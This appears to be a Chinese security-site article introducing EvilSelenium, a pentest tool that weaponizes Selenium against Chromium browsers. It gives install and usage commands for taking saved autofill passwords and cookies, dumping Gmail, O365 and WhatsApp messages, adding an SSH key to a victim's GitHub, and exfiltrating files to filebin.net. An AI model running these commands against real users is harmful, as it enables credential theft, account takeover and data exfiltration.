![](https://image.3001.net/images/20220422/1650558056_626184681c88ed8b4af46.png!small)

## 关于EvilSelenium

EvilSelenium是一款基于[
_Selenium_](https://www.selenium.dev/)的渗透测试工具，该工具基于武器化的Selenium实现其功能，可以帮助广大研究人员针对基于Chromium的浏览器进行安全分析和渗透测试。

## 功能介绍

> 1、通过autofill获取存储的凭证信息；
>
> 2、获取Cookie数据；
>
> 3、获取网站屏幕截图；
>
> 4、导出Gmail/O365电子邮件数据；
>
> 5、导出Whats*App消息；
>
> 6、下载&提取文件信息；
>
> 7、向GitHub添加SSH密钥；

或者，广大研究人员也可以根据自己的需求扩展工具功能，比如说从用户的GDrive/OneDrive下载文件等等。

## 注意事项

> 1、该工具在运行的时候，将会判断当前设备是否存在正在运行的浏览器进程，以便获取包含了密码和活动会话的用户浏览器数据；
>
> 2、Selenium模块不是非常稳定，而且随着网站的变化，某些模块的运行可能会偶尔中断。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/mrd0x/EvilSelenium.git

## 工具安装

我们可以使用“/install”命令来下载Chrome Driver和Selenium
WebDriver，这两个组件是EvilSelenium运行所必需的。EvilSelenium支持Chrome v100-90。

此方法已在Windows 10，Chrome v97 & v90上进行过测试：

    
    
    EvilSelenium.exe /install

## 工具帮助信息

    
    
    EvilSelenium.exe /?
    
     
    
    /help - Show this help menu.
    
     
    
    SETUP:
    
    /install - Install chromedriver & Selenium webdriver. Run this once.
    
     
    
    GLOBAL: (accepted with every command)
    
    /browserdir [appdata_local_routing] - Use custom browser, Input should be the routing inside %appdatalocal% dir (e.g. "Microsoft\Edge")
    
     
    
    RECON:
    
    /enumsavedsites [out_path] - Check which websites have passwords saved via screenshot(s).
    
    /screenshot [website] [out_path] - Screenshot a given webpage.
    
     
    
    CREDENTIALS:
    
    /autorun - Extract saved credentials from common websites.
    
    /dynamicid [login_page] [username_id] [password_id] - Extract saved credentials from a website, providing the username field ID & password field ID.
    
    /dynamicname [login_page] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value & password name value.
    
    /dynamicname2 [login_page] [username_position] [password_position] [username_name] [password_name] - Extract saved credentials from a website, providing the username field name value, password name value and their positions.
    
     
    
    COOKIES:
    
    /cookies [website] - Grabs cookies for a given website.
    
     
    
    MODULES:
    
    /download [file_url] [seconds] - Downloads a file and specify time to wait for download to finish. File extensions should not be executable.
    
    /exfil [local_file] [seconds] - Uploads a file on filebin.net and outputs the download link.
    
    /gmail [out_path] [num_of_emails] - Fetches emails from mail.google.com if user is authenticated. Max 50 emails.
    
    /outlook [out_path] [num_of_emails] - Fetches emails from Outlook if user is authenticated.
    
    /o365 [out_path] [num_of_emails] - Fetches emails from O365 Outlook if user is authenticated.
    
    /github [key] - Add your SSH key to Github if user is authenticated.
    
    /whats*app [out_path] - Fetches Whats*app messages if user is authenticated (BETA).

## 工具配置&使用

### 全局配置

默认配置下，EvilSelenium将会尝试使用Google Chrome的用户数据文件夹来获取数据，其他基于Chromium的浏览器也同样支持该功能。

如果想要使用不同的基于Chrome的浏览器，则需要向“%localappdata%”目录中添加下列内容（一些常见浏览器）：

    
    
    # Brave
    
    /browserdir BraveSoftware\Brave-Browser
    
    
    # Microsoft Edge
    
    /browserdir Microsoft\Edge
    
    
    # Vivaldi
    
    /browserdir Vivaldi

### 网络侦查模块

    
    
    /enumsavedsites - 获取“chrome://settings/passwords”的屏幕截图。
    
    /screenshot - 获取任意网站的屏幕截图。

### 凭证模块

    
    
    /autorun - 针对常用网站的预构建模版。
    
    /dynamicid - 提供包含了用户名输入字段ID和密码字段ID的登录URL。
    
    /dynamicname - 如果字段不包含ID，则提供字段的name值。
    
    /dynamicname2 - 提供字段的name值以及索引位置。

### Cookie模块

    
    
    /cookies - 从指定网站导出Cookie数据。

### 杂项模块

下面给出的是该工具支持的一些额外模块：

    
    
    /download - 下载文件&指定等待下载的时间。
    
    /exfil - 向filebin.net上传一个文件&指定上传完成的等待时间。上传完成后，写入文件下载链接。
    
    /gmail - 用户认证后，从mail.google.com获取电子邮件，电子邮件最大数量为50
    
    /outlook - 用户认证后，从Outlook获取电子邮件。
    
    /o365 - 用户认证后，从O365 Outlook获取电子邮件。
    
    /github - 用户认证后，向GitHub添加SSH密钥。
    
    /whats*app - 用户认证后，获取Whats*App消息。

## 工具使用演示

![](https://image.3001.net/images/20220422/1650558328_6261857857197a02e450b.png!small)

## 项目地址

 **EvilSelenium：** 【[ _GitHub传送门_](https://github.com/mrd0x/EvilSelenium)】

## 参考资料

> [ _https://www.selenium.dev/_](https://www.selenium.dev/)
>
> [
> _https://en.wiki*pedia.org/wiki/Chromium_(web_browser)_](https://en.wikipedia.org/wiki/Chromium_\(web_browser\))

